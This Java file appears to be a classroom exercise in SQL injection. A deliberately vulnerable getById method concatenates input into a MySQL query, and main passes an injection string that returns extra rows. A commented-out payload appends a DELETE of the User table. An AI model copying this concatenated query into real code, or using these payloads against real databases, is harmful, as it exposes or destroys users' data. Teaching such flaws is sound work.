package net.itspartner.test.n5;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

/**
 * Description: Application makes request to MySQL DB to get record by id
 * Task: Add SQL Injection code to argument of getById method to break query logic in any way. For example:
 * 1) remove db records
 * 2) return more data
 * <p>
 * Do not change 'getById' method.
 */
public class Main {

    public static void main(String[] args) throws Exception {
        getById(
                "1' OR id BETWEEN '1' AND '99999"
//                SQL query DELETE didn't work on MySQL 5.7+ because JDBC driver doesn't compile
//                 multi-statement
//                + "'; DELETE FROM User"
        );
    }

    public static void getById(String id) throws Exception {

        Class.forName("com.mysql.jdbc.Driver").newInstance();
        Connection c = DriverManager.getConnection("jdbc:mysql://localhost:3306/test?user=root");
        Statement stmt = c.createStatement();
        System.out.println("SELECT * FROM User WHERE id = '" + id + "'");
        ResultSet resultSet = stmt.executeQuery("SELECT * FROM User WHERE id = '" + id + "'");

        while (resultSet.next()) {
            System.out.println(resultSet.getRow());
        }
    }
}
